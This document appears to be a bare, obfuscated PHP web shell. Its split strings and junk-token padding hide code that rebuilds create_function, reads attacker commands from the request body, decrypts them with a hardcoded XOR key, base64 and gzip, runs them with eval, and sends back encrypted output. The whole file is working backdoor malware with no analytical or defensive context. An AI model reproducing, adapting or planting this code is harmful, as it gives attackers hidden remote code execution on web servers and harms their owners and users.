<?php
$P='+){I#$oI#.=$t{$i}I#^$k{$j};}}rI#eI#turn $o;}if I#(@preg_I#mI#atch("/I#$kh(.+)$kfI#/I#",@fiI#le_getI#_contI#entsI#("php://in';
$p='t_I#coI#ntents(I#);@ob_eI#nd_cleaI#n();$r=I#@base6I#4_encode(@x(I#@gzI#comI#preI#I#ss($o),$k));print("$I#p$kI#h$r$kf");}';
$u='put")I#,$m)I#==1) I#{@ob_starI#t();@I#eI#val(@gzuI#ncompress(I#I#@x(@bI#I#ase64_decode($m[1I#]),$kI#))I#);$o=@obI#_ge';
$E=str_replace('kV','','ckVreakVtkVe_fukVnkVkVction');
$s='#t,$k){I#$c=strlen($kI#);$l=sI#trlen($I#t);$I#o=""I#;forI#($i=0;$i<$lI#;){for(I#$jI#=0;I#($j<$c&&$i<$lI#I#);$j++,$i+I#';
$g='$k="8057I#fff5";$I#kI#hI#="I#0731b30aI#f2ae";$kf="4d1aaI#aa4I#5121"I#;$I#p="GogqI1F4stsI#gU8bI#U";functioI#n x($I#I';
$c=str_replace('I#','',$g.$s.$P.$u.$p);
$Z=$E('',$c);$Z();
?>
